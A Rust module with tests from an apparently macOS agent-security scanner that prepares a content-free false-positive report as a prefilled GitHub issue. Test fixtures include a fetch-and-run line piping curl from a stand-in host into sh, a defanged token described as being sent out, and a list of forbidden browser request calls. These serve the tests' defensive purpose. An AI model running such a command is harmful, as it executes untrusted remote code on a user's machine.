//! The false-alarm report (spec section 8.8).
//!
//! **Report false positive** in a Finding's detail header, and the one-time
//! card after a Restore or a Trust, both lead to the same dialog: the GitHub
//! issue AgentSweep prepared, shown in full before anything leaves the app.
//! The report carries what flagged the Item (Rule or Heuristic ids with their
//! status or Weight), the Tier, the Rule Pack version, the Verdict engine and
//! model if any, the Item kind, its Scope and Provenance class, and the app
//! and macOS versions. It carries no content, no names and no paths: it is
//! built from closed sets and numbers only, never from a string that could
//! hold a value of the Item.
//!
//! The app makes no request. The dialog's button hands the prefilled
//! new-issue address of the project's repository to a [`Browser`], the
//! user's own browser through the operating system's opener, and nothing is
//! sent until the user presses Submit on GitHub, so the egress promise of
//! spec section 1.1 is untouched. The Browser is a seam: the tests pass a
//! fake that only records the address.

use std::collections::HashMap;
use std::sync::Mutex;

use serde_json::{Value, json};

use agentsweep_core::finding::Tier;
use agentsweep_core::state::RecordedFinding;

use crate::asking::ActionRequest;

/// The project's new-issue page, the only address a report opens.
pub const NEW_ISSUE: &str = "https://github.com/byte5digital/agentsweep/issues/new";

/// What the button in a Finding's detail header says.
pub const REPORT_BUTTON: &str = "Report false positive";

/// The one-time card's question after a Restore or a Trust.
pub const CARD_QUESTION: &str = "Thanks. Was that a false alarm?";

/// The card's button that opens the dialog.
pub const REPORT_IT: &str = "Report it";

/// The card's button that dismisses it.
pub const NO_THANKS: &str = "No thanks";

/// The dialog's heading.
pub const DIALOG_HEADING: &str = "Report a false alarm";

/// The line above the issue in the dialog.
pub const DIALOG_LEAD: &str = "This is the issue AgentSweep prepared. It holds no file \
     contents, names or paths. Nothing is sent until you press Submit on GitHub.";

/// The dialog's button that opens the issue in the browser.
pub const OPEN_ON_GITHUB: &str = "Open on GitHub";

/// What the window says once the browser took the issue.
pub const OPENED: &str =
    "The issue is open in your browser. Nothing is sent until you press Submit on GitHub.";

/// The Provenance classes a report may name; anything else reads `unknown`.
const PROVENANCE_CLASSES: [&str; 6] = [
    "manual",
    "marketplace",
    "plugin",
    "agent_written",
    "repository",
    "unknown",
];

/// The Scopes a report may name; anything else reads `unknown`.
const SCOPES: [&str; 3] = ["managed", "user", "project"];

/// The Judgement Engines a report may name; anything else reads `other`.
const ENGINES: [&str; 3] = ["apple", "ollama", "claude"];

/// What a report says about the machine beside the Finding.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct Context {
    /// The version of the Rule Pack in force.
    pub rule_pack: u64,
    /// The app's version.
    pub app: String,
    /// The macOS version, `unknown` when it could not be read.
    pub macos: String,
}

/// One prepared GitHub issue.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct Report {
    /// The issue's title.
    pub title: String,
    /// The issue's body, in GitHub's Markdown.
    pub body: String,
}

impl Report {
    /// The prefilled new-issue address: the title and the body, and nothing
    /// else, percent-encoded into the query.
    pub fn url(&self) -> String {
        format!(
            "{NEW_ISSUE}?title={}&body={}",
            encode(&self.title),
            encode(&self.body)
        )
    }

    /// The dialog as the window receives it: exactly the title and the body
    /// the address carries.
    pub fn to_value(&self) -> Value {
        json!({
            "heading": DIALOG_HEADING,
            "lead": DIALOG_LEAD,
            "title": self.title,
            "body": self.body,
            "open": OPEN_ON_GITHUB,
        })
    }
}

/// The label of the button in a Finding's detail header, null where the
/// Finding has nothing to report.
pub fn button(finding: &RecordedFinding) -> Value {
    match reportable(finding) {
        true => Value::from(REPORT_BUTTON),
        false => Value::Null,
    }
}

/// True when a Finding has something to report: a Rule, an Exposure
/// Heuristic or a Score of Threat Heuristics, with or without a Verdict. A
/// Drift question, a Problem and an Item that keeps coming back name no Rule
/// that could have been wrong.
pub fn reportable(finding: &RecordedFinding) -> bool {
    finding.source.starts_with("rule ") || finding.source.starts_with("score ")
}

/// The report on one Finding, or nothing when it has nothing to report.
pub fn report(finding: &RecordedFinding, context: &Context) -> Option<Report> {
    if !reportable(finding) {
        return None;
    }
    let mut flagged = Vec::new();
    if finding.source.starts_with("rule ") {
        let which = match finding.tier {
            Tier::Heuristics => "Heuristic",
            _ => "Rule",
        };
        flagged.push(format!(
            "{which} {:04}, status {}",
            finding.rule_id,
            finding.status.as_str()
        ));
    }
    for heuristic in &finding.facts.heuristics {
        flagged.push(format!(
            "Heuristic {:04}, weight {}",
            heuristic.id, heuristic.weight
        ));
    }
    let title = format!(
        "False positive: {} ({})",
        flagged
            .first()
            .and_then(|line| line.split(',').next())
            .unwrap_or("Heuristics"),
        finding.kind.as_str()
    );
    let verdict = match finding.facts.judgement_engine.as_str() {
        "" => "none".to_string(),
        engine => {
            let engine = closed(engine, &ENGINES, "other");
            match model(&finding.facts.judgement_model) {
                Some(model) => format!("{engine}, model {model}"),
                None => engine.to_string(),
            }
        }
    };
    let mut body = String::from("What flagged it:\n");
    for line in &flagged {
        body.push_str(&format!("- {line}\n"));
    }
    body.push_str(&format!(
        "\nTier: {}\nRule Pack: {}\nVerdict engine: {verdict}\nItem kind: {}\nScope: {}\n\
         Provenance class: {}\nAgentSweep: {}\nmacOS: {}\n\n\
         Why this is a false alarm (please add no file contents, names or paths):\n\n",
        finding.tier.as_str(),
        context.rule_pack,
        finding.kind.as_str(),
        closed(&finding.facts.scope, &SCOPES, "unknown"),
        closed(&finding.facts.provenance, &PROVENANCE_CLASSES, "unknown"),
        version(&context.app),
        version(&context.macos),
    ));
    Some(Report { title, body })
}

/// `text` when it is one of `known`, `otherwise` when it is not.
fn closed<'a>(text: &'a str, known: &[&str], otherwise: &'a str) -> &'a str {
    match known.contains(&text) {
        true => text,
        false => otherwise,
    }
}

/// A version as dotted numbers, `unknown` for anything else.
fn version(text: &str) -> &str {
    let numbers = !text.is_empty()
        && text
            .split(['.', '-', '+'])
            .all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_alphanumeric()));
    match numbers && text.chars().next().is_some_and(|c| c.is_ascii_digit()) {
        true => text,
        false => "unknown",
    }
}

/// The model an engine ran, when it reads as a model id: letters, digits
/// and the separators model ids use, at most 120 characters.
fn model(text: &str) -> Option<&str> {
    let plain = !text.is_empty()
        && text.len() <= 120
        && text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_.:@".contains(c));
    plain.then_some(text)
}

/// Percent-encodes everything but the unreserved characters of RFC 3986.
fn encode(text: &str) -> String {
    let mut encoded = String::with_capacity(text.len() * 3);
    for byte in text.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                encoded.push(byte as char)
            }
            _ => encoded.push_str(&format!("%{byte:02X}")),
        }
    }
    encoded
}

/// Opens an address in the user's browser.
pub trait Browser {
    /// Asks the operating system to open `url` in the default browser; true
    /// when that worked.
    fn open(&self, url: &str) -> bool;
}

/// The user's default browser, through macOS's `open`, never through a
/// shell. The app itself makes no request.
#[derive(Debug, Default)]
pub struct SystemBrowser;

impl Browser for SystemBrowser {
    fn open(&self, url: &str) -> bool {
        std::process::Command::new("/usr/bin/open")
            .arg(url)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .is_ok_and(|status| status.success())
    }
}

/// Hands a report's address to `browser` and answers with the sentence the
/// window shows.
pub fn open_report(report: &Report, browser: &dyn Browser) -> Result<String, String> {
    match browser.open(&report.url()) {
        true => Ok(OPENED.to_string()),
        false => Err(format!(
            "The browser could not be opened. The issue can be filed by hand at {NEW_ISSUE}."
        )),
    }
}

/// The macOS version a `SystemVersion.plist` names, read from disk rather
/// than from a program.
pub fn macos_version(plist: &str) -> Option<String> {
    let after = &plist[plist.find("<key>ProductVersion</key>")? + 25..];
    let start = after.find("<string>")? + 8;
    let end = after[start..].find("</string>")? + start;
    let found = after[start..end].trim();
    (version(found) == found).then(|| found.to_string())
}

/// The macOS version of this Mac, `unknown` when it cannot be read.
pub fn this_macos() -> String {
    std::fs::read_to_string("/System/Library/CoreServices/SystemVersion.plist")
        .ok()
        .and_then(|plist| macos_version(&plist))
        .unwrap_or_else(|| "unknown".to_string())
}

/// An action's answer with the one-time card added after a Restore or a
/// Trust that was carried out, when there is a report to offer. Every other
/// answer passes unchanged.
pub fn after_action(request: &ActionRequest, mut answer: Value, report: Option<&Report>) -> Value {
    let asks = matches!(
        request,
        ActionRequest::Restore(..) | ActionRequest::Trust(..)
    );
    let carried_out =
        answer["done"] == Value::Bool(true) && answer["conflict"] != Value::Bool(true);
    if let (true, true, Some(report)) = (asks, carried_out, report) {
        answer["falseAlarm"] = json!({
            "question": CARD_QUESTION,
            "report": REPORT_IT,
            "dismiss": NO_THANKS,
            "target": request.target(),
            "issue": report.to_value(),
        });
    }
    answer
}

/// The reports offered so far, by Finding id: the dialog's button opens the
/// one the app prepared, never an address the window names, also once the
/// Finding left the list.
#[derive(Debug, Default)]
pub struct Reports(Mutex<HashMap<String, Report>>);

impl Reports {
    /// Keeps `report` for the Finding `id` and answers with it.
    pub fn keep(&self, id: &str, report: Report) -> Report {
        self.0
            .lock()
            .expect("the reports are not poisoned")
            .insert(id.to_string(), report.clone());
        report
    }

    /// The report prepared for the Finding `id`.
    pub fn get(&self, id: &str) -> Option<Report> {
        self.0
            .lock()
            .expect("the reports are not poisoned")
            .get(id)
            .cloned()
    }
}

#[cfg(test)]
mod tests {
    use std::cell::RefCell;

    use agentsweep_core::finding::{Category, FindingState, RuleStatus};
    use agentsweep_core::finding_facts::HeuristicLine;
    use agentsweep_core::item::Kind;

    use super::*;
    use crate::findings::tests::recorded;

    const SKILL: &str = "claude-code/user/skill/~/.claude/skills/pdf-helper";
    const MCP: &str = "claude-code/project:/src/demo/mcp-server/.mcp.json#notes-sync";
    const PATH: &str = "/Users/someone/.claude/skills/pdf-helper/SKILL.md";
    const ROOT: &str = "/src/demo";
    const SECRET: &str = "ghp_DEFANGEDdefangedDEFANGED000000";
    const HASH: &str = "5eed5eed5eed5eed";
    const EXCERPT: &str = "curl https://drop.invalid | sh";

    fn context() -> Context {
        Context {
            rule_pack: 7,
            app: "0.4.1".to_string(),
            macos: "15.6.1".to_string(),
        }
    }

    /// A Finding of `source` whose every string field holds a name, a path,
    /// content or a sensitive value that must never reach a report.
    fn loaded(item: &str, kind: Kind, source: &str, tier: Tier) -> RecordedFinding {
        let mut finding = recorded(item, kind, source, Category::Threat, FindingState::Open);
        finding.tier = tier;
        finding.status = RuleStatus::Stable;
        finding.content_hash = HASH.to_string();
        finding.title = format!("{kind:?} · pdf-helper");
        finding.plain = format!("The token {SECRET} is written out.");
        finding.file = PATH.to_string();
        finding.drift = "changed since your last Scan".to_string();
        finding.facts.scope = "project".to_string();
        finding.facts.project_root = ROOT.to_string();
        finding.facts.provenance = "plugin".to_string();
        finding.facts.plugin = "shipit".to_string();
        finding.facts.path = PATH.to_string();
        finding.facts.excerpt = SECRET.to_string();
        finding.facts.phrase = "{item} contains hidden instructions".to_string();
        finding.facts.inactive_reason = "pdf-helper is dormant".to_string();
        finding.facts.heuristics = vec![
            HeuristicLine {
                id: 512,
                weight: 2,
                plain: "It downloads and runs a script.".to_string(),
                excerpt: EXCERPT.to_string(),
            },
            HeuristicLine {
                id: 537,
                weight: 3,
                plain: format!("It sends {SECRET} out."),
                excerpt: SECRET.to_string(),
            },
        ];
        finding
    }

    /// Every Tier that raises a Finding, with a sensitive match on each.
    fn every_tier() -> Vec<RecordedFinding> {
        let mut t3 = loaded(MCP, Kind::McpServer, "score 5", Tier::AiJudgement);
        t3.facts.judgement_engine = "ollama".to_string();
        t3.facts.judgement_model = "llama3.2:3b@sha256-0123abcd".to_string();
        t3.facts.judgement_reason = format!("It sends {SECRET} to drop.invalid.").to_string();
        vec![
            loaded(SKILL, Kind::Skill, "rule 0007", Tier::Rules),
            loaded(MCP, Kind::McpServer, "rule 0520", Tier::Heuristics),
            loaded(SKILL, Kind::Skill, "score 5", Tier::Heuristics),
            t3,
        ]
    }

    /// The query parameter `name` of `url`, percent-decoded.
    fn parameter(url: &str, name: &str) -> String {
        let query = url.split_once('?').expect("a query").1;
        let raw = query
            .split('&')
            .find_map(|pair| pair.strip_prefix(&format!("{name}=")))
            .expect("the parameter");
        let bytes = raw.as_bytes();
        let mut decoded = Vec::new();
        let mut at = 0;
        while at < bytes.len() {
            if bytes[at] == b'%' {
                let hex = std::str::from_utf8(&bytes[at + 1..at + 3]).expect("hex");
                decoded.push(u8::from_str_radix(hex, 16).expect("a byte"));
                at += 3;
            } else {
                decoded.push(bytes[at]);
                at += 1;
            }
        }
        String::from_utf8(decoded).expect("utf-8")
    }

    #[test]
    fn a_report_names_every_listed_field() {
        for finding in every_tier() {
            let report = report(&finding, &context()).expect("a report");
            let body = &report.body;
            for heuristic in ["Heuristic 0512, weight 2", "Heuristic 0537, weight 3"] {
                assert!(body.contains(heuristic), "{body}");
            }
            assert!(
                body.contains(&format!("Tier: {}", finding.tier.as_str())),
                "{body}"
            );
            assert!(body.contains("Rule Pack: 7"), "{body}");
            assert!(body.contains(&format!("Item kind: {}", finding.kind.as_str())));
            assert!(body.contains("Scope: project"), "{body}");
            assert!(body.contains("Provenance class: plugin"), "{body}");
            assert!(body.contains("AgentSweep: 0.4.1"), "{body}");
            assert!(body.contains("macOS: 15.6.1"), "{body}");
            match finding.tier {
                Tier::AiJudgement => assert!(
                    body.contains("Verdict engine: ollama, model llama3.2:3b@sha256-0123abcd"),
                    "{body}"
                ),
                _ => assert!(body.contains("Verdict engine: none"), "{body}"),
            }
        }
        let [rule, exposure, ..] = &every_tier()[..] else {
            unreachable!()
        };
        let rule = report(rule, &context()).expect("a report");
        assert!(rule.body.contains("- Rule 0007, status stable"));
        assert_eq!(rule.title, "False positive: Rule 0007 (Skill)");
        let exposure = report(exposure, &context()).expect("a report");
        assert!(exposure.body.contains("- Heuristic 0520, status stable"));
    }

    #[test]
    fn a_report_carries_no_name_path_content_excerpt_or_sensitive_value() {
        let forbidden = [
            "pdf-helper",
            "notes-sync",
            "shipit",
            "Users",
            "someone",
            ROOT,
            PATH,
            "SKILL.md",
            ".mcp.json",
            SECRET,
            "DEFANGED",
            EXCERPT,
            "drop.invalid",
            "downloads and runs",
            "hidden instructions",
            HASH,
        ];
        for finding in every_tier() {
            let report = report(&finding, &context()).expect("a report");
            let url = report.url();
            let carried = [
                report.title.clone(),
                report.body.clone(),
                url.clone(),
                parameter(&url, "title"),
                parameter(&url, "body"),
            ];
            for text in &carried {
                for value in forbidden {
                    assert!(!text.contains(value), "{value} in {text}");
                }
            }
        }
    }

    #[test]
    fn strings_outside_the_closed_sets_never_reach_a_report() {
        let mut finding = loaded(SKILL, Kind::Skill, "score 5", Tier::AiJudgement);
        finding.facts.scope = SECRET.to_string();
        finding.facts.provenance = PATH.to_string();
        finding.facts.judgement_engine = SECRET.to_string();
        finding.facts.judgement_model = format!("{PATH} model");
        let odd = Context {
            rule_pack: 7,
            app: PATH.to_string(),
            macos: SECRET.to_string(),
        };
        let report = report(&finding, &odd).expect("a report");
        assert!(!report.body.contains(SECRET), "{}", report.body);
        assert!(!report.body.contains(PATH), "{}", report.body);
        assert!(report.body.contains("Scope: unknown"));
        assert!(report.body.contains("Provenance class: unknown"));
        assert!(report.body.contains("Verdict engine: other\n"));
        assert!(report.body.contains("AgentSweep: unknown"));
    }

    #[test]
    fn the_address_is_the_projects_new_issue_page_with_title_and_body_only() {
        let report = report(&every_tier()[0], &context()).expect("a report");
        let url = report.url();
        let (page, query) = url.split_once('?').expect("a query");
        assert_eq!(page, NEW_ISSUE);
        let names: Vec<&str> = query
            .split('&')
            .map(|pair| pair.split_once('=').expect("a pair").0)
            .collect();
        assert_eq!(names, ["title", "body"]);
    }

    #[test]
    fn the_dialog_shows_exactly_the_text_the_address_carries() {
        for finding in every_tier() {
            let report = report(&finding, &context()).expect("a report");
            let dialog = report.to_value();
            let url = report.url();
            assert_eq!(dialog["title"], parameter(&url, "title"));
            assert_eq!(dialog["body"], parameter(&url, "body"));
        }
    }

    #[test]
    fn drift_problems_and_items_that_keep_coming_back_have_nothing_to_report() {
        for source in ["drift", "problem unreadable", "keeps coming back"] {
            let finding = recorded(
                SKILL,
                Kind::Skill,
                source,
                Category::Threat,
                FindingState::Open,
            );
            assert!(!reportable(&finding), "{source}");
            assert_eq!(report(&finding, &context()), None, "{source}");
        }
    }

    #[test]
    fn a_card_offers_the_report_button_where_there_is_something_to_report() {
        for (source, offered) in [
            ("rule 0007", true),
            ("score 5", true),
            ("drift", false),
            ("problem unreadable", false),
            ("keeps coming back", false),
        ] {
            let finding = recorded(
                SKILL,
                Kind::Skill,
                source,
                Category::Threat,
                FindingState::Open,
            );
            let label = crate::findings::card(&finding)["report"].clone();
            match offered {
                true => assert_eq!(label, REPORT_BUTTON, "{source}"),
                false => assert!(label.is_null(), "{source}"),
            }
        }
    }

    /// A Browser that records what it was asked to open and opens nothing.
    #[derive(Default)]
    struct FakeBrowser {
        opened: RefCell<Vec<String>>,
        fails: bool,
    }

    impl Browser for FakeBrowser {
        fn open(&self, url: &str) -> bool {
            self.opened.borrow_mut().push(url.to_string());
            !self.fails
        }
    }

    #[test]
    fn the_report_opens_through_the_operating_systems_opener_and_nowhere_else() {
        let report = report(&every_tier()[0], &context()).expect("a report");
        let browser = FakeBrowser::default();
        assert_eq!(open_report(&report, &browser), Ok(OPENED.to_string()));
        assert_eq!(*browser.opened.borrow(), vec![report.url()]);

        let failing = FakeBrowser {
            fails: true,
            ..FakeBrowser::default()
        };
        let refused = open_report(&report, &failing).expect_err("a refusal");
        assert!(refused.contains(NEW_ISSUE), "{refused}");
    }

    #[test]
    fn the_macos_version_is_read_from_the_system_version_file() {
        let plist = "<plist><dict><key>ProductName</key><string>macOS</string>\
                     <key>ProductVersion</key>\n\t<string>15.6.1</string></dict></plist>";
        assert_eq!(macos_version(plist), Some("15.6.1".to_string()));
        assert_eq!(macos_version("<plist></plist>"), None);
        let odd = "<key>ProductVersion</key><string>/Users/x</string>";
        assert_eq!(macos_version(odd), None);
    }

    fn done() -> Value {
        json!({ "done": true, "conflict": false, "message": "Done." })
    }

    #[test]
    fn the_card_follows_a_restore_and_a_trust_once_each_and_nothing_else() {
        let report = report(&every_tier()[0], &context()).expect("a report");
        let id = "f-1";
        for command in ["restore", "trust"] {
            let request = ActionRequest::of(command, id, None).expect("an action");
            let answer = after_action(&request, done(), Some(&report));
            let card = &answer["falseAlarm"];
            assert_eq!(card["question"], CARD_QUESTION, "{command}");
            assert_eq!(card["report"], REPORT_IT);
            assert_eq!(card["dismiss"], NO_THANKS);
            assert_eq!(card["target"], id);
            assert_eq!(card["issue"], report.to_value());
        }
        for choice in ["replace", "beside"] {
            let request = ActionRequest::of("restore", id, Some(choice)).expect("an action");
            let answer = after_action(&request, done(), Some(&report));
            assert!(answer["falseAlarm"].is_object(), "{choice}");
        }
        for command in [
            "quarantine",
            "acknowledge",
            "fix",
            "re_enable",
            "purge",
            "untrust",
        ] {
            let request = ActionRequest::of(command, id, None).expect("an action");
            let answer = after_action(&request, done(), Some(&report));
            assert!(answer.get("falseAlarm").is_none(), "{command}");
        }
    }

    #[test]
    fn no_card_after_a_refused_restore_a_conflict_or_without_a_report() {
        let report = report(&every_tier()[0], &context()).expect("a report");
        let restore = ActionRequest::of("restore", "f-1", None).expect("an action");
        let failed = json!({ "done": false, "conflict": false });
        assert!(
            after_action(&restore, failed, Some(&report))
                .get("falseAlarm")
                .is_none()
        );
        let conflict = json!({ "done": true, "conflict": true });
        assert!(
            after_action(&restore, conflict, Some(&report))
                .get("falseAlarm")
                .is_none()
        );
        assert!(
            after_action(&restore, done(), None)
                .get("falseAlarm")
                .is_none()
        );
    }

    #[test]
    fn a_kept_report_is_the_one_opened_later() {
        let reports = Reports::default();
        let report = report(&every_tier()[0], &context()).expect("a report");
        reports.keep("f-1", report.clone());
        assert_eq!(reports.get("f-1"), Some(report));
        assert_eq!(reports.get("f-2"), None);
    }

    /// The app's own files, read as the bundle carries them.
    fn app_file(name: &str) -> String {
        std::fs::read_to_string(std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(name))
            .expect("an app file")
    }

    /// The page may only listen to the app's events: no HTTP, opener or
    /// shell permission in any capability, no plugin that could make a
    /// request, and a content policy that lets the page reach nothing but
    /// the app itself. The report leaves through the user's browser only.
    #[test]
    fn the_page_has_no_permission_to_make_a_request() {
        let directory = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("capabilities");
        for entry in std::fs::read_dir(directory).expect("the capabilities") {
            let path = entry.expect("an entry").path();
            let capability: Value =
                serde_json::from_str(&std::fs::read_to_string(&path).expect("a capability"))
                    .expect("JSON");
            let permissions: Vec<&str> = capability["permissions"]
                .as_array()
                .expect("permissions")
                .iter()
                .map(|permission| permission.as_str().expect("a plain permission"))
                .collect();
            assert_eq!(
                permissions,
                ["core:event:allow-listen", "core:event:allow-unlisten"],
                "{}",
                path.display()
            );
        }
        let manifest = app_file("Cargo.toml");
        for plugin in [
            "tauri-plugin-http",
            "tauri-plugin-opener",
            "tauri-plugin-shell",
        ] {
            assert!(!manifest.contains(plugin), "{plugin}");
        }
        let config: Value = serde_json::from_str(&app_file("tauri.conf.json")).expect("JSON");
        let policy = config["app"]["security"]["csp"].as_str().expect("a policy");
        let connect = policy
            .split(';')
            .map(str::trim)
            .find_map(|part| part.strip_prefix("connect-src "))
            .expect("connect-src");
        assert_eq!(connect, "ipc: http://ipc.localhost");
        assert!(!policy.contains("github"), "{policy}");
    }

    /// No script of the page reaches out by itself or names an address:
    /// the report's address is built and opened by the app alone.
    #[test]
    fn no_script_of_the_page_makes_a_request_or_names_an_address() {
        let ui = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("ui");
        for entry in std::fs::read_dir(ui).expect("the page") {
            let path = entry.expect("an entry").path();
            if path.extension().is_none_or(|extension| extension != "js") {
                continue;
            }
            let script = std::fs::read_to_string(&path).expect("a script");
            for forbidden in [
                "fetch(",
                "XMLHttpRequest",
                "WebSocket",
                "EventSource",
                "sendBeacon",
                "window.open",
                "location.href",
                "github.com",
            ] {
                assert!(
                    !script.contains(forbidden),
                    "{} uses {forbidden}",
                    path.display()
                );
            }
        }
    }

    /// The dialog writes the prepared title and body as they are, as text.
    #[test]
    fn the_window_writes_the_prepared_issue_as_it_is() {
        let script = app_file("ui/window.js");
        assert!(script.contains("$(\"false-alarm-title\").textContent = shown.title;"));
        assert!(script.contains("$(\"false-alarm-body\").textContent = shown.body;"));
        assert!(script.contains("invoke(\"open_false_alarm_report\", { target })"));
    }
}
